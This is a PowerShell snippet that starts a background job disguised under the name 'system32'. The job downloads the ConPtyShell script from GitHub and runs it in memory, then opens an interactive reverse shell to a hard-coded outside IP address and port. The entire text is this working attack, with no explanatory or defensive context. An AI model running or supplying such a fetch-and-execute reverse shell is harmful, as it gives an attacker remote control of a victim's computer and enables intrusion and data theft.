Start-Job -Name "system32" -ScriptBlock {
    IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing);
    Invoke-ConPtyShell 18.141.129.246 16976
}
